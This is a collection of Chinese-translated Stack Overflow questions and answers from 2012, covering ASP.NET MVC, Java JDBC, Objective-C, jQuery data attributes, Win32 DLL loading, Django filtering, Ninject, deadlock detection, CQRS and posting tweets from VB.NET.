大家好，我有一个文本框和一个文件上传控件和一个表格来显示上传的文件......我的表格中有一个删除链接......这样用户可以在点击提交按钮之前删除任何上传的文件...... .为此我有模型

```
 public BugModel()
    {
        if (ListFile == null)
            ListFile = new List<BugAttachment>();
    }
    public List<BugAttachment> ListFile { get; set; }
}

public class BugAttachment
{
    public string FileName { get; set; }
    public int BugAttachmentID { get; set; }
    public string AttachmentName { get; set; }
    public int BugID { get; set; }
    public string AttachmentUrl { get; set; }
    public string AttachedBy { get; set; }
    public string ErrorMessage { get; set; }
} 
```

当用户上传文件时，我将它们保存在 Listfile 列表中并将它们显示在表中。现在我想要从服务器和 Listfile 中删除上传的文件。我已经成功从上传的文件夹中删除了文件...现在，当用户单击删除链接时，我也想从 ListFile 中删除 AttachmentName 和 AttachmentUrl ..我应该怎么做..任何想法都非常感谢

这就是我到目前为止所做的

```
 public ActionResult Delete(string FileName, BugModel model)
    {

        if (Session["CaptureData"] == null)
        {
        }
        else
        {
            model = (BugModel)Session["CaptureData"];
        }
       char DirSeparator = System.IO.Path.DirectorySeparatorChar;

        string FilesPath = ";" + FileName;
        string filenameonly = name + Path.GetFileName(FilesPath);
        string FPath = "Content" + DirSeparator + "UploadedFiles" + DirSeparator + filenameonly;
        // Don't do anything if there is no name
        if (FileName.Length == 0) return View();
        // Set our full path for deleting
        string path = FilesPath + DirSeparator;
        // Check if our file exists
        if (System.IO.File.Exists(Path.GetFullPath(AppDomain.CurrentDomain.BaseDirectory + FPath)))
        {
            // Delete our file                System.IO.File.Delete(Path.GetFullPath(AppDomain.CurrentDomain.BaseDirectory + FPath));                 
        }            
        return View("LoadBug");
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T12:25:34.437

如果`FileName`是唯一的，您可以创建一个新的 BugAttachments 对象列表并排除具有指定 FileName 的特定对象

```
List<BugAttachment> allBugAttachemnts=GetAllAttachmentsFromSomeWhere();

List<BugAttachment> newBugAttachments = allBugAttachemnts.ListFile.
                              Where(x => x.FileName!= FileName).ToList(); 
```

现在`newBugAttachments` 将有删除后的项目。

您也可以使用`RemoveAll`更新原始列表的方法

```
allBugAttachemnts.RemoveAll(x => x.FileName!= FileName); 
```

假设`GetAllAttachmentsFromSomeWhere`方法返回指定的可用`BugAttachment`对象列表，`BugModel`并且`FileName`是具有要删除的文件名的参数

# java - 使用 Eclipse IDE 的 Java 代码中的 Class.forName 问题

> ID：12215230
> 
> 赞同：0
> 
> 时间：2012-08-31T12:18:22.503
> 
> 标签：java, eclipse, database-connection

我正在使用 Eclipse IDE 版本：Helios Service Release 2 和 JDK 版本 1.6。我的系统上安装了 SQL Server 2008。我已经下载了 Microsoft JDBC 驱动程序并将 jar 文件的路径包含在 Eclipse IDE-> Project Properties->Java build Path-> Libraries -> Add External jars 中。

我为数据库连接编写了这段代码：

```
package com.ucs.test;

import java.sql.*;

public class ConnectDatabase {

Connection DBconnection = null;
String dbName = "silkopenview";
String userName = "SilkTestAdmin"; 
String password = "Nbv12345";

Class.forName(drivername);

DBconnection = DriverManager.getConnection(dbName,userName,password);

} 
```

但我收到以下错误：

*令牌“DBconnection”上的
语法错误，此令牌后预期的 VariableDeclaratorId 令牌“drivername”上的语法错误，此令牌后预期的 VariableDeclaratorId 令牌
上的语法错误，错位的构造*

我是 Java 和 Eclipse IDE 的新手。请帮助我纠正这个错误。快速帮助表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:21:34.607

这些陈述：

```
Class.forName(drivername);    
DBconnection = DriverManager.getConnection(dbName,userName,password); 
```

目前只是类的一部分 - 不在方法、构造函数或静态初始化程序等中。您可能希望将它们放在构造函数中。前面的没问题，因为它们是变量声明——尽管你是否真的*希望*它们成为实例变量是另一回事。

另请注意，`driverName`您给出的代码中的任何地方都没有声明。

顺便说一句，如果您对 Java 足够陌生，以至于遇到了这种事情，那么您应该完全放弃当前的代码：您当前正在尝试跑步，然后才能走路。正确地与数据库对话并非易事，*在学习 Java 语法的同时*尝试学习如何做到这一点会很麻烦。从简单的控制台应用程序开始，让您学习语言和一些核心类型（字符串、数字、集合等），*然后*转向数据库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:21:09.580

```
Class.forName(drivername);
DBconnection = DriverManager.getConnection(dbName,userName,password); 
```

你不能把它们放在你放在课堂上的地方，你必须把它们放在构造函数/方法中，比如：

```
public class ConnectDatabase {

   Connection dbConnection = null;
   String dbName = "silkopenview";
   String userName = "SilkTestAdmin"; 
   String password = "Nbv12345";

   public Connection getConnection() {
      Class.forName(drivername);
      dbConnection = DriverManager.getConnection(dbName,userName,password);
      return dbConnection;
   }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T12:21:19.127

您需要将语句放在方法而不是类块中。

```
Class.forName(drivername); 
```

和

```
DBconnection = DriverManager.getConnection(dbName,userName,password); 
```

鉴于您使用的是 SQL Server，您需要声明`driverName`：

```
final String driverName = "com.microsoft.sqlserver.jdbc.SQLServerDriver"; 
```

# c# - 在网页上嵌入用户控件

> ID：12215236
> 
> 赞同：1
> 
> 时间：2012-08-31T12:18:44.713
> 
> 标签：c#, html, object, activex, embed

我正在使用 c# 创建用户控件，我构建了 myControll.dll。

但是我怎么能把它嵌入到网页上呢？我没有使用`Asp.net`.

我尝试了以下

```
<OBJECT id="myControll" name="myControll.dll#myControll.userControl" >
</OBJECT> 
```

我怎样才能做到这一点？

谢谢，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-01T10:12:49.923

1.  我知道框架 1.1 和 2.0 有配置工具。为 Url 设置完整的代码信任（例如 127.0.0.7 - 本地）。（3.0-3.5使用2.0工具）
2.  将站点（例如 127.0.0.1）添加到 IE 中的受信任站点区域。可能您需要提前启用其他单选框。
3.  框架 4-4.5 没有配置工具。我想 .manifest 文件或证书或（SRP）控制面板 -> 管理 -> 本地安全策略 -> 软件限制策略或 AppLocker 无效。我试过这个但不成功。有些人推荐 COM 属性或在项目设置中选中 2 个框。我不明白为什么（我绝望地测试它）。

caspol 可能会有所帮助。 [http://msdn.microsoft.com/en-us/library/cb6t8dtz(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/cb6t8dtz(v=vs.100).aspx)

对不起我的英语不好！

# objective-c - 在 if-else 块中确定对象类型

> ID：12215240
> 
> 赞同：0
> 
> 时间：2012-08-31T12:18:58.313
> 
> 标签：objective-c, oop, class

给定以下代码：

```
for (id object in anArray){
    if ([object isKindOfClass:[ClassOne class]]){
       ClassOne *myObj = [[ClassOne alloc] init];
    }else if ([object isKindOfClass:[ClassTwo class]]){
       ClassTwo *myObj = [[ClassTwo alloc] init];
    }
    myObj.property = TRUE;
} 
```

编译器将引发关于`myObj`（未声明的标识符）的错误，这在某种程度上是显而易见的（“如果两个条件都为假，我该怎么办？”）。这意味着我必须在 if-else 块之前定义对象，但我必须使用哪种类型的对象？如果我使用`id`会有错误`myObj.property = TRUE;`，如果我使用`ClassOne`or`ClassTwo`会有一些关于不兼容指针分配的警告。我应该使用其他方式而不是给定的代码吗？

谢谢你。

（注意：该片段是在没有使用语法检查或测试的情况下编写的，因此它可能包含错误）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:30:33.063

协议怎么样？

```
@protocol MyProtocol

@property (assign, nonatomic) BOOL myProperty;

@end 
```

然后：

```
for (id anObject in anArray){
    if ([anObject conformsToProtocol:@protocol(MyProtocol)]) {
        Class clazz = [anObject class];
        id<MyProtocol>  myObject = [[clazz alloc] init];
        myObject.myProperty = YES;
    }
} 
```

这是我能想到的最干净、最短的解决方案。您不需要强制转换，而是利用 Objective-c 动态绑定的强大功能。您不必添加太多 if-else 语句。相反，您只需确保传入的对象符合您的协议。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:24:16.663

您可以使用 id 来初始化您的类，然后在设置 .property = TRUE 之前将它们转换为正确的自定义类

```
for (id object in anArray){
    id myObj;
    if ([object isKindOfClass:[ClassOne class]]){
        myObj = [[ClassOne alloc] init];
    }else if ([object isKindOfClass:[ClassTwo class]]){
        myObj = [[ClassTwo alloc] init];
    }

    if ([object isKindOfClass:[ClassOne class]]){
        ((ClassOne *)myObj).property = TRUE;
    }else if ([object isKindOfClass:[ClassTwo class]]){
        ((ClassTwo *)myObj).property = FALSE; // or whatever
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T12:25:50.640

由于 myObj 的范围仅限于 if 块，因此仅在 if 块中使用。现在，如果 myObj 在 if 块之外定义，则对象不能具有相同的名称。

```
for (id object in anArray){
 if ([object isKindOfClass:[ClassOne class]]){
   ClassOne *myObj = [[ClassOne alloc] init];
   myObj.property = TRUE;
 }else if ([object isKindOfClass:[ClassTwo class]]){
   ClassTwo *myObj = [[ClassTwo alloc] init];
   myObj.property = TRUE;
 }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T12:27:24.987

这取决于实际情况。例如，为什么需要`myObj`在 if-else 语句之外？如果您需要将它传递给另一个方法，您可以创建一个基类，例如 ex`ClassBase`和 make`ClassOne`并`ClassTwo`继承`ClassBase`，然后让您的方法接受`ClassBase`作为参数（当然，如果两个对象有共同点）。如果不是这种情况，那么在每个语句中执行逻辑有什么问题：

```
if ([object isKindOfClass:[ClassOne class]]){
       ClassOne *myObj = [[ClassOne alloc] init];
       myObj.property = YES;
       [self doSomethingWith:myObj];
 }else if ([object isKindOfClass:[ClassTwo class]]){
       ClassTwo *myObj = [[ClassTwo alloc] init];
       myObj.otherProperty = YES;
       [self doSomethingElseWith:myObj];
    }
//end of method 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-08-31T12:24:25.337

```
for (id object in anArray){
    if ([object isKindOfClass:[ClassOne class]]){
        ClassOne *myObj = [[ClassOne alloc] init];
        myObj.property = TRUE;
    }
    else if ([object isKindOfClass:[ClassTwo class]]){
        ClassTwo *myObj = [[ClassTwo alloc] init];
        myObj.property = TRUE;
    }

} 
```

# javascript - 存储数据以与 jquery 一起使用的最佳方法是什么？

> ID：12215241
> 
> 赞同：0
> 
> 时间：2012-08-31T12:18:58.080
> 
> 标签：javascript, jquery, anchor

我不是 Javascript/jQuery 的重度用户，但我已经开始真正开始创建自己的 UI 内容，例如图库查看器、警报动画、弹出表单等...

但是，在需要时存储数据以将数据集中在一起的最佳方式是什么？

例如：使用画廊查看器，很像 Lightbox，我拉入具有 rel=viewer 的锚点的 href。

```
<a href="url" rel=viewer" />
<a href="url" rel=viewer" /> 
```

然后我将其扩展为管理员用户能够删除这些图像，但我需要传递媒体 ID 来执行此操作。所以我加了...

```
<a href="url" rel=viewer" viewerid="123" />
<a href="url" rel=viewer" viewerid="456" /> 
```

我不喜欢创建自己的属性的想法，因为我无疑会忘记我所拥有的。但是是否可以在锚点中存储 javascript 对象/数据数组？就像是...

```
<a href="url" rel=viewer" data="{'id':'123', 'foo':'bar'}" /> 
```

进而...

```
var photos = new Array();
$('a[rel=viewer]').each(function(){
    photos.push(  new Array( $(this).attr('data') )  );
}); 
```

给我类似的东西

```
photos[0] = array('id' => 123, 'foo' => 'bar')
photos[1] = array('id' => 456, 'foo' => 'bar') 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T12:21:08.380

JQuery[数据函数](http://api.jquery.com/data/)听起来像您需要的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T12:22:25.700

试试这个[jQuery.data](http://api.jquery.com/jQuery.data/)

```
jQuery.data(document.body, 'foo', 52);
jQuery.data(document.body, 'bar', 'test'); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-31T12:24:18.650

据我所知，标签内的数据必须命名？有效的句法是

```
<a href="url" rel=viewer" data-array="{'id':'123', 'foo':'bar'}" /> 
```

你可以稍后阅读它：

```
$('a').data('array') 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T12:27:11.600

出于简单的目的，我会坚持使用在 HTML5 中完全有效的[自定义数据属性。](http://www.whatwg.org/specs/web-apps/current-work/multipage/elements.html#embedding-custom-non-visible-data-with-the-data-%2a-attributes)

如果您需要更深入的方法，您最好将数据与 DOM /jQuery.data 分离，并在您的应用程序中使用适当的模型层 [想想[Backbone.js](http://backbonejs.org/) ]，尽管这意味着学习曲线有点困难并且有时可能会过度杀伤力.

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-31T12:29:46.060

我发现最好的方法是使用 HTML5 数据属性和 jQuery。

这是一个使用 JSON 对对象进行字符串化并在需要数据时将其转回对象的[示例。](http://jsfiddle.net/eZjap/)

```
var obj = 
{
  type: "something",
  id: 3,
  src: "somesrc"    
}

var data = JSON.stringify(obj);
$('a').attr('data-object', data);

var returned = $('a').attr('data-object');
returned = $.parseJSON(returned);
console.log(returned); 
```

​</p>

# c++ - LoadLibraryA 失败，找不到模块，但文件名正确

> ID：12215249
> 
> 赞同：1
> 
> 时间：2012-08-31T12:19:15.590
> 
> 标签：c++, winapi

我正在尝试加载这样的dll：

```
dll_handle = LoadLibraryA(QString("%1\\module.dll")
                        .arg(QApplication::applicationDirPath().replace("/", "\\"))
                        .toLocal8Bit().data()); 
```

我传递给 LoadLibraryA 的结果文件名是正确的，文件存在并且进程可以读取。问题是什么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-31T12:26:43.730

`GetLastError`报告 126，即`ERROR_MOD_NOT_FOUND`。显然找不到模块。

这有两个明显的原因：

1.  找不到您尝试加载的模块。
2.  可以找到您尝试加载的模块，但找不到它所依赖的模块之一。

我建议在配置文件模式下使用[Dependency Walker进行调试。](http://www.dependencywalker.com/)这将在运行时监控您的应用程序并准确告诉您找不到哪个模块。

最后，在这个时代，你真的应该选择`LoadLibraryW`.

# c# - 如何使用属性名称字符串动态从 Com 互操作对象中获取/设置值

> ID：12215255
> 
> 赞同：1
> 
> 时间：2012-08-31T12:19:33.950
> 
> 标签：c#, .net, dynamic, interop

我有以下代码：

```
Type type = Type.GetTypeFromProgID("interopTypeName");
dynamic obj = Activator.CreateInstance(type);
string propertyName = "somePropertyName";
// how to get somePropertyName from obj? 
```

可以在没有动态的情况下做到这一点。[这](https://stackoverflow.com/questions/1161675/using-reflection-with-com-interop)是[Marc Gravell](https://stackoverflow.com/users/23354/marc-gravell)的解决方案。但是，如果可以使用动态来完成它，那就很有趣了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-03T16:08:56.627

Mark Gravell 有一个名为[FastMember的开源项目，可以使用](http://code.google.com/p/fast-member/)[api 动态生成](http://code.google.com/p/fast-member/source/browse/FastMember/CallSiteCache.cs)的代码轻松访问属性。

```
var wrapped = ObjectAccessor.Create(obj); 
var result = wrapped[somePropertyName]; 
```

# django - 如何从 request.GET 参数创建过滤器？

> ID：12215259
> 
> 赞同：2
> 
> 时间：2012-08-31T12:19:39.113
> 
> 标签：django

> **可能重复：**
> [使用来自用户的动态 Q 对象进行过滤？](https://stackoverflow.com/questions/1957240/filter-using-q-object-with-dynamic-from-user)

我正在开发我的应用程序中的过滤器功能。我通过 jquery 向 Django 发送一个逗号分隔的字符串（在 jquery 中，我将空格替换为 +，以便可以通过网络发送）。

```
/?ajax&sales_item=t2,+t1 
```

现在在检索 GET 参数时的视图中，我可以看到 Django 已经将 + 替换为空格，这很棒。然后我用逗号分割关键字并去掉空格。

```
sales_item_raw = request.GET['sales_item']
sales_item_keywords = sales_item_raw.split(',') 
```

我需要首先检查给定的名称是否作为销售项目存在。我必须使用 a `icontains`，因此`sales_items`可以是多个项目。

```
for item in sales_item_keywords:
        sales_items = profile.company.salesitem_set.filter(item_description__icontains=item.strip()) 
```

最后但并非最不重要的一点是，查询集用于过滤给定 sales_items 的交易：

```
deals_queryset = deals_queryset.filter(sales_item__in=sales_items) 
```

如果用户只过滤一个可以正常工作的关键字，但是如果有两个关键字，`sales_items`则在每次循环迭代中显然会被覆盖。

解决此问题的最有效方法是什么？我应该将`sales_items`每次迭代中的内容附加到循环外的列表中吗？并最终将新名单送入决赛`deals_queryset.filter`？

我不确定这是否是解决此问题的好方法...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T13:23:03.033

使用 Django 的[Q](https://docs.djangoproject.com/en/dev/topics/db/queries/#complex-lookups-with-q-objects)对象在过滤器中创建“或”逻辑。

```
# create a chain of Qs, one for each item, and "or" them together 
q_filters = Q(item_description__icontains=sales_item_keywords[0].strip())
for item in sales_item_keywords[1:]:
    q_filters = q_filters | Q(item_description__icontains=item.strip())   

# do a single filter with the chained Qs
profile.company.salesitem_set.filter(q_filters) 
```

这是丑陋的代码，因为我不确定如何优雅地处理初始 Q，因为我不确定您可以将所有其他 Q 链接到的“空”Q 是什么，包括第一个 Q。（我猜你可以使用`Q(pk=pk)`，但这以不同的方式很难看。）

编辑：上面的伊格纳西奥链接显示了方式，即

```
q_filters = reduce(operator.or_, (Q(item_description__icontains=item.strip()) for item in sales_items_keywords))
profile.company.salesitem_set.filter(q_filters) 
```

# c# - 在 Ninject 模块中获取解析的类型

> ID：12215260
> 
> 赞同：0
> 
> 时间：2012-08-31T12:19:49.047
> 
> 标签：c#, asp.net-mvc, ninject, event-dispatching

**问题**：

在我的*域层程序*集中，我存储了两个接口：

```
public interface IDomainEvent { } 
```

和

```
public interface IHandle<T> where T: IDomainEvent, new() 
```

`EventDispatcher`类也在那里定义：

```
public static class EventDispatcher {
    [ThreadStatic]
    private static List<Delegate> actions;
    [ThreadStatic]
    private static List<Object> handlers;

    public static List<Object> Handlers { 
        get { return handlers; } 
        set { handlers = value; } 
    }

    public static void Register<T>(Action<T> callback) where T : IDomainEvent, new() {
        if(null == actions) {
            actions = new List<Delegate>();
            actions.Add(callback);
        }
    }

    public static void ClearCallbacks() {
        actions = null;
    }

    public static void Raise<T>(T @event) where T : IDomainEvent, new() {
        if(null != Handlers) {
            foreach(var handler in Handlers.Where(h => h is IHandle<T>)) {
                ((IHandle<T>)handler).Handle(@event);
            }
        }

        if(null != actions) {
            foreach(var action in actions) {
                if(action is Action<T>) {
                    ((Action<T>)action)(@event);
                }
            }
        } // if(null != actions) {
    }
} 
```

表示层组件中有一个模块：

```
public class EventDispatchingModule : NinjectModule {

    public override void Load() {

        // EventDispatcher.Handlers = this.Kernel.GetAll(IHandle<T>); Can't do that!
        // Bind<IHandle<CarHasBeenRegisteredEvent>>().To<CarHasBeenRegisteredHandler();
    }
} 
```

所以我不能`Kernel.GetAll(IHandle<T>)`在那里打电话，因为它不能解析`T`参数。

我怎么解决这个问题？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:44:05.890

无需使用模块（我没有使用 ninject，但类似的东西）：

```
// Put these in the domain project

public class EventDispatcher
{
    private static IEventDispatcher _dispatcher;

    public static void Setup(IEventDispatcher dispatcher)
    {
        _dispatcher = dispatcher;
    }

    public static void Dispatch<T>(T domainEvent) where T : IDomainEvent
    {
        _dispatcher.Dispatch<T>(domainEvent);
    }
}

public interface IEventDispatcher
{
    public void Dispatch<T>(T domainEvent) where T : IDomainEvent;
}

// and this one in the project which has Ninject

public class NinjectEventDispatcher : IEventDispatcher
{
    private static IKernel _container;

    public NinjectEventDispatcher(IKernel container)
    {
        _container = container;
    }

    public void Dispatch<T>(T domainEvent) where T : IDomainEvent
    {
        foreach (var listener in _container.GetAll<IHandle<T>>())
        {
            listener.Handle(domainEvent);
        }
    }
}

// And after the container have been configured:
EventDispatcher.Setup(new NinjectEventDispatcher(_container)); 
```

但我不知道 ninject 如何处理作用域对象（可能也想接收事件）。

我的容器内置了域事件，请在本文中阅读更多内容：http: [//www.codeproject.com/Articles/440665/Having-fun-with-Griffin-Container](http://www.codeproject.com/Articles/440665/Having-fun-with-Griffin-Container)

**更新：**

我更新了代码示例，使域项目不知道 Ninject。

您没有在此代码中使用服务位置。事件分派器的内部结构是。即您的任何代码都不受它的影响。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T13:24:57.540

您可以使用以下代码获取所有处理程序

```
Kernel.GetAll(typeof (IHandle<>)); 
```

但无论如何，在 NInjectModule 中加载所有 IHander 并不是一个好主意，因为您不知道是否已经加载了其他模块（并且其他模块也可以注册 Handler）。我建议使 EventDispatcher 类不是静态的并将其注册在您需要的范围内（如果您需要每个请求的新处理程序 - 在请求范围内，否则 - 在单例范围内。您可以使用构造函数注入的处理程序，例如：

```
Kerner.Bind<EventDispatcher>().ToSelf()
      .InRequestScope()
      .WithConstructorArgument("handlers", c => c.Kernel.GetAll(typeof(IHandler<>))) 
```

希望这可以帮助

# java - Java byecode 操作以检测潜在的死锁

> ID：12215263
> 
> 赞同：2
> 
> 时间：2012-08-31T12:20:01.797
> 
> 标签：java, multithreading, deadlock

我在我们的 Java 应用程序中遇到了另一个死锁，并开始考虑如何在未来检测潜在的死锁。我有一个如何做到这一点的想法，但它似乎太简单了。

我想听听人们对此的看法。

我计划使用典型的数据集在我们的测试环境中运行我们的应用程序几个小时。

我认为可以在我们的应用程序上执行字节码操作，这样，每当它需要一个锁（例如进入一个同步块）时，锁的细节就会被添加到一个 ThreadLocal 列表中。

我可以编写一个算法，在稍后的某个时间点，比较所有线程的列表并检查是否有任何线程以相反的顺序包含相同的锁对——这将被报告为死锁的可能性。同样，我将使用字节码操作将这种定期检查添加到我的应用程序中。

所以我的问题是：这个想法（a）是原创的，（b）是可行的吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T12:27:05.890

这是我们在学习并发课程时谈到的。我不确定您的实现是否是原创的，但确定潜在死锁的分析概念并不是唯一的。有 Java 的动态分析工具，例如[JCarder](http://www.jcarder.org/)。还有[一些可以静态进行的分析的](http://dl.acm.org/citation.cfm?id=1488042)研究。

诚然，我环顾四周已经有几年了。我不认为 JCarder 是我们讨论的特定工具（至少，这个名字听起来并不熟悉，但我找不到其他任何东西）。但关键是检测死锁的分析不是一个原始概念，我会从研究产生可用工具的研究开始——我怀疑算法，如果不是实现，通常是可用的.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-31T12:24:08.990

`Lock`通过提供我自己的实现，我已经做了类似的事情。

这些天我使用[actor模型](http://en.wikipedia.org/wiki/Actor_model)，因此几乎不需要锁定数据（因为我几乎没有共享可变数据）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-31T12:23:46.007

如果您不知道，您可以使用[Java MX bean](http://docs.oracle.com/javase/6/docs/api/java/lang/management/ThreadMXBean.html#findMonitorDeadlockedThreads%28%29)以编程方式检测死锁线程。这对您的测试没有帮助，但它至少可以帮助您在生产中更好地检测和恢复。

```
ThreadMXBean threadMxBean = ManagementFactory.getThreadMXBean();
long[] deadLockedThreadIds = threadMxBean.findMonitorDeadlockedThreads();
// log the condition or even interrupt threads if necessary
... 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T12:37:49.920

这样你可以找到一些死锁，但永远不能证明它们不存在。我最好开发静态检查工具，一种字节码分析器，为每个同步方法提供注释。注解应该显示被注解的方法在资源图中的位置。然后的任务是在图中找到循环。每个循环都意味着死锁。

# jquery - 重建 DIV id

> ID：12215268
> 
> 赞同：3
> 
> 时间：2012-08-31T12:20:19.577
> 
> 标签：jquery

我有一段 php 输出 div（取决于数组中有多少）并为该 div 分配一个 id（即 div_1、div_2）等

我还设置了一个隐藏字段，其中包含输出了多少 div 的计数（divcount）

所以假设我有 5 个 div，那么 div 的 id 将是

*   div_1,
*   div_2,
*   div_3
*   等等等等
*   并且隐藏字段（divcount）将设置为 5

如果 div_2 被删除，我将 divcount 隐藏字段设置为 4。

我现在需要做的是将另一个 div 的 id 重建为：

*   div_1,
*   div_2,
*   div_3，
*   div_4，但目前我只剩下 div_1、div_3、div_4、div_5

我想我需要一个循环来循环遍历每个 div 并将那个 div 的 id 分配给循环的值

IE

*   div_1 id 变成 div_1
*   div_3 id 变成 div_2
*   div_4 id 变为 div_3
*   div_5 id 变为 div_4

谁能建议如何做到这一点？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:23:44.890

你可以使用`each`方法。

```
$('div[id^="div_"]').each(function(i){
   this.id = 'div_'+(++i)
}) 
```

[小提琴](http://jsfiddle.net/jJhJP/1/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:24:37.040

jquery的每个功能都是要走的路...

```
var tally = 1;
$("div[id*=div_]").each( function() {
    $(this).prop("id","div_"+tally);
    tally++;
}); 
```

# android - onSharedPreferenceChanged 和 PreferenceFragment

> ID：12215272
> 
> 赞同：1
> 
> 时间：2012-08-31T12:20:27.650
> 
> 标签：android

尝试遵循[http://developer.android.com/guide/topics/ui/settings.html](http://developer.android.com/guide/topics/ui/settings.html)中给出的示例，但发现它很困难，因为它在使用和不使用片段之间任意切换。

当我使用最新的 SDK (16) 时，我在为我的应用程序实现首选项时接受了它的建议使用片段

我正在尝试实现`onSharedPreferenceChanged`一种方法，以便在用户更改首选项值时更新首选项摘要。

我应该在片段或父活动中实现回调方法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-20T23:42:09.227

如果您支持从 11 到 16 的 API 级别，`onSharedPreferenceChanged()`则方法必须仅在您的片段中实现。

如果您支持较低的 API 级别，您应该只在活动上实现此方法。

# node.js - node.js 中的事件触发器是如何调试的？

> ID：12215273
> 
> 赞同：1
> 
> 时间：2012-08-31T12:20:35.383
> 
> 标签：node.js, passport.js

我将举一个具体的例子，取自我在使用 Passport 时遇到的当前问题。在身份验证期间或之后，似乎触发了一个事件，最终出现此错误：

```
 error: invalid input syntax for integer: "test@email.com"
at p.parseE (.../node_modules/pg/lib/connection.js:412:11)
at p.parseMessage (.../node_modules/pg/lib/connection.js:287:17)
at Socket.p.connect (.../node_modules/pg/lib/connection.js:45:22)
at Socket.EventEmitter.emit (events.js:88:17)
at TCP.onread (net.js:395:14) 
```

现在，在这种情况下，这与传递的电子邮件登录（在这种情况下是 PostgreSQL）而不是用户 ID 有关，但我没有真正的方法来找出这个事件在哪里被触发，什么代码正在初始化事件，以及触发它的代码。

有比 grep 发射器更好的方法吗？

# design-patterns - CQRS：按需读取模型？

> ID：12215276
> 
> 赞同：7
> 
> 时间：2012-08-31T12:20:44.360
> 
> 标签：design-patterns, architecture, cqrs

据我了解，CQRS 提倡将读取模型与域模型分开，并为每个必要的域模型投影使用特定的读取模型。

从使用角度来看，读取模型的存储和检索方式应该是透明的——您发出查询并获取读取模型，而不关心它是如何制作的。

许多示例和文章使用单独的表来存储读取模型并通过响应域模型更改来重新生成它们。

我不太喜欢这种方法，原因如下：

*   并非经常需要所有可能的读取模型；
*   需求更改可能会使现有的读取模型无效，因此需要重新生成所有读取模型；
*   如果由于某种原因读取模型包含无法在生成时存储但需要计算的属性，您将被迫使用存储过程/函数/视图；
*   由于在域模型更改时使用应用程序级缓存的情况下，读取模型与域模型是分开的，因此您需要通知所有应用程序旧的读取模型需要从缓存中逐出；
*   有时不可能也不希望完全非规范化复杂对象图，因此您需要读取与特定域实体版本一致的模型，即它们需要在同一事务中生成；
*   一些域实体具有经常更改但需要包含在每个读取模型中的属性。

基于此，我正在考虑让查询服务应该：

*   对于需要频繁生成的读取模型和/或域实体的简单投影：不要存储它们，而是通过查询数据库中的域模型实体通过 ORM 生成它们；
*   对于不需要频繁生成且复杂的域实体投影的读取模型，生成它们并存储在数据库表中。

我还看到有些人建议将读取模型存储为 blob。将读取模型存储为 blob 的问题在于，如果您需要在它们上进行搜索，则需要提取属性以进行索引；如果您需要全文搜索，即使您必须以全文可以理解的格式存储它们工具。

如您所见，我基本上希望读取仅在查询执行后存在的模型，而不是基于域更改事件生成的模型。CQRS 可以接受这个解决方案吗？我研究 CQRS 的原因是通过将可缓存的视图模型与用户操作处理分离来改进应用程序架构，让 AJAX 启用的 Web 应用程序在用户操作后进行异步更新，并通过将业务逻辑全部放置来减少初级开发人员生成不可维护代码的空间在我看来，CQRS 的地方甚至不忠实的实施似乎是朝着正确方向迈出的良好一步。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-03T13:12:04.510

CQRS 不*要求*将读取模型存储在单独的表（或文档，如果您使用文档数据库）中，尽管这通常是一种很好的方法，并且与事件溯源结合使用效果很好。例如，读取模型*可以*由数据库视图或 ORM 查询支持。

在将 CQRS 引入遗留系统的某些部分时，这可能是一种很好的方法。

您在此处建议的方法之前已被建议，例如请参阅[Ayende 的这篇文章](http://ayende.com/blog/4375/encapsulation-is-the-enemy-of-the-user-interface)；我认为它被称为“薄读模型”或类似的。我会说去吧。

你可能有兴趣阅读

*   [Jimmy Bogard 关于 CQRS 中的神话的文章](http://lostechies.com/jimmybogard/2012/08/22/busting-some-cqrs-myths/)。
*   Ayende 的“限制你的抽象”系列文章，[从这里开始](http://ayende.com/blog/154209/limit-your-abstractions-refactoring-toward-reduced-abstractions)

# vb.net - 从 vb.net 发布推文

> ID：12215277
> 
> 赞同：4
> 
> 时间：2012-08-31T12:20:49.283
> 
> 标签：vb.net, twitter

如何使用 vb.net 在我的 Twitter 帐户上发布自定义推文？

如果不可能，我怀疑，有没有办法用 c# 或 javascript 实现这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:23:22.183

您可以使用[twitterizer](http://www.twitterizer.net/)库。

* * *

这是一个如何使用它的示例：

```
Dim tokens As New OAuthTokens()
tokens.AccessToken = "XXX"
tokens.AccessTokenSecret = "XXX"
tokens.ConsumerKey = "XXX"
tokens.ConsumerSecret = "XXX"

Dim tweetResponse As TwitterResponse(Of TwitterStatus) = TwitterStatus.Update(tokens, "Hello, #Twitterizer")

If tweetResponse.Result = RequestResult.Success Then
        ' Tweet posted successfully!
Else
        ' Something bad happened
